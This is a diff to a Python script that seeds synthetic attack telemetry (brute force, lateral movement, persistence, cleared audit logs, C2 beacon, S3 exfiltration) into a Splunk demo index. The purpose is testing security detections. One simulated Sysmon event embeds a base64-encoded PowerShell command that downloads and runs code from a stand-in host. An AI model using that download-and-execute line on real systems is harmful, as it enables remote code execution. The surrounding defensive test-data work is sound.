@@ -1,4 +1,4 @@
-"""Seed a self-contained, reproducible SOC dataset into Splunk (index=soc_demo).
+r"""Seed a self-contained, reproducible SOC dataset into Splunk (index=soc_demo).
 
 Why this exists: a Grand-Prize demo needs *security* data, and judges should be
 able to reproduce it in minutes — no 5 GB BOTS download. So we generate a small,
@@ -10,12 +10,17 @@ The detection logic (agent SPL + validator) is behavioural and never references
 these values — it finds the attack by pattern (failed-login burst, periodic
 beacon, large egress), exactly as it would on a held-out box.
 
-Embedded story (for the writer's reference, NOT given to the agent):
-  1. Brute force  : external 203.0.113.66 hammers svc_backup on vpn01, then succeeds
-  2. Lateral move : svc_backup then logs into many internal hosts in minutes
-  3. Web attack   : same external IP probes /admin with SQLi + path traversal
-  4. C2 beacon    : 10.10.0.42 calls 198.51.100.23:443 on a fixed ~60s interval
-  5. Exfil        : 10.10.0.42 ships ~900 MB outbound in one burst
+Embedded ATT&CK chain (for the writer's reference, NOT given to the agent) — spans
+6 sourcetypes (auth, web, firewall, Windows Security/System, Sysmon, AWS CloudTrail),
+the "many connectors" story, with cross-source corroboration:
+   Initial Access  T1110        : 203.0.113.66 brute-forces svc_backup (linux_secure + windows:security 4625), then succeeds
+   Execution       T1059.001    : winword.exe spawns powershell.exe -enc <b64> (Sysmon)
+   Persistence     T1543.003    : 7045 kernel-mode-driver service from C:\Windows\Temp (windows:system)
+   Priv Esc        T1078        : 4672 SeDebugPrivilege granted to svc_backup (windows:security)
+   Defense Evasion T1070.001    : 1102 audit log cleared (windows:security)
+   Lateral Move    T1021        : svc_backup into many hosts (linux_secure + windows:security 4624 type 3)
+   C2              T1071        : 10.10.0.42 -> 198.51.100.23:443 on a fixed ~60s beacon (cisco:asa)
+   Exfil           T1567/T1530  : ~900 MB egress + public S3 bucket + bulk GetObject (cisco:asa + aws:cloudtrail)
 
 stdlib only; reads .env; idempotent (skips if soc_demo already has events)."""
 from __future__ import annotations
@@ -189,17 +194,93 @@ def build_events(now: float) -> list[tuple]:
                    f'dest_port={random.choice([80,443,53])} protocol=tcp '
                    f'bytes_out={random.randint(500,50000)} bytes_in={random.randint(500,90000)}'))
 
+    # ===== Endpoint + cloud telemetry (what the WinEventLog/Sysmon/AWS connectors ship) =====
+    # Custom sourcetypes + non-"WinEventLog" sources so Splunk's built-in
+    # source::WinEventLog props (which suppress key=value auto-extraction) don't fire.
+    WINSEC = ("windows:security", "windows_security.log")
+    WINSYS = ("windows:system", "windows_system.log")
+    SYSMON = ("XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "Sysmon")
+    CLOUD = ("aws:cloudtrail", "cloudtrail")
+
+    # 7) Windows 4625 failed logons corroborate the brute force (2nd source for T1110)
+    for i in range(20):
+        ts = bf_start + i * random.uniform(10, 18)
+        ev.append((ts, WINSEC[0], WINSEC[1], "WIN-VPN01",
+                   f'EventCode=4625 status=0xC000006A user=svc_backup src_ip={attacker} '
+                   f'LogonType=3 message="An account failed to log on"'))
+    # 4672 special privileges assigned to the compromised account (T1078 / priv-esc)
+    ev.append((breach + 30, WINSEC[0], WINSEC[1], "WIN-VPN01",
+               'EventCode=4672 user=svc_backup privileges="SeDebugPrivilege,SeTcbPrivilege" '
+               'message="Special privileges assigned to new logon"'))
+    # 4624 type-3 lateral logons across Windows hosts (T1021, corroborates linux_secure)
+    for j, h in enumerate(["WIN-DB01", "WIN-APP01", "WIN-DC01"]):
+        ev.append((breach + 200 + j * 60, WINSEC[0], WINSEC[1], h,
+                   f'EventCode=4624 LogonType=3 user=svc_backup src_ip=10.10.0.42 '
+                   f'dest_host={h} message="An account was successfully logged on"'))
+
+    # 8) Persistence — 7045 service install from a temp path (T1543.003; the Ensemble
+    #    rootkit-driver signal: kernel-mode driver service from C:\Windows\Temp)
+    ev.append((breach + 400, WINSYS[0], WINSYS[1], "WIN-DC01",
+               'EventCode=7045 service_name=WinDefendUpd '
+               'image_path="C:\\Windows\\Temp\\svc_update.exe" '
+               'service_type="kernel mode driver" start_type="auto start" '
+               'message="A new service was installed in the system"'))
+
+    # 9) Execution — Sysmon process-create: winword -> powershell -enc (T1059.001, bad ancestry)
+    import base64 as _b64
+    _enc = _b64.b64encode(
+        "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a')"
+        .encode("utf-16-le")).decode()
+    ev.append((breach + 120, SYSMON[0], SYSMON[1], "WIN-APP01",
+               'EventCode=1 ParentImage="C:\\Program Files\\Microsoft Office\\winword.exe" '
+               'Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
+               f'CommandLine="powershell.exe -nop -w hidden -enc {_enc}" User=svc_backup'))
+    ev.append((breach + 150, SYSMON[0], SYSMON[1], "WIN-APP01",
+               'EventCode=3 Image="powershell.exe" DestinationIp=198.51.100.23 '
+               'DestinationPort=443 User=svc_backup'))
+
+    # 10) Defense Evasion — Windows security audit log cleared (T1070.001)
+    ev.append((breach + 3600, WINSEC[0], WINSEC[1], "WIN-DC01",
+               'EventCode=1102 user=svc_backup message="The audit log was cleared"'))
+
+    # 11) Cloud (CloudTrail) — failed console logins from the attacker IP, then a bucket
+    #     made public + bulk GetObject (T1078.004 + T1530 cloud exfil)
+    for i in range(8):
+        ts = bf_start - 1800 + i * random.uniform(20, 60)
+        ev.append((ts, CLOUD[0], CLOUD[1], "aws",
+                   'eventName=ConsoleLogin errorMessage="Failed authentication" '
+                   f'userIdentity_userName=svc-deploy sourceIPAddress={attacker} '
+                   'awsRegion=us-east-1 additionalEventData_MFAUsed=No'))
+    ev.append((breach + 1800, CLOUD[0], CLOUD[1], "aws",
+               'eventName=PutBucketAcl userIdentity_userName=svc-deploy '
+               'sourceIPAddress=10.10.0.42 requestParameters_bucketName=corp-backups-prod '
+               'requestParameters_x_amz_acl=public-read awsRegion=us-east-1'))
+    ev.append((breach + 1900, CLOUD[0], CLOUD[1], "aws",
+               'eventName=GetObject userIdentity_userName=svc-deploy '
+               'sourceIPAddress=10.10.0.42 requestParameters_bucketName=corp-backups-prod '
+               'bytes_out=734003200 awsRegion=us-east-1'))
+
     ev.sort(key=lambda e: e[0])
     return ev
 
 
+def reset_index() -> None:
+    """Delete the demo index + its data, then recreate (clean reproducible state)."""
+    st, _ = _send("DELETE", f"/services/data/indexes/{INDEX}", params={"output_mode": "json"})
+    print(f"  reset: DELETE index {INDEX} -> HTTP {st}")
+    time.sleep(2)
+
+
 def main() -> None:
     force = "--force" in sys.argv
+    reset = "--reset" in sys.argv
     print(f"Seeding index={INDEX} on {HOST}")
+    if reset:
+        reset_index()
     ensure_index()
     existing = count_events()
-    if existing and not force:
-        print(f"  index already has {existing} events — skipping (use --force to add more).")
+    if existing and not (force or reset):
+        print(f"  index already has {existing} events — skipping (use --reset to rebuild, --force to add).")
         return
 
     now = time.time()
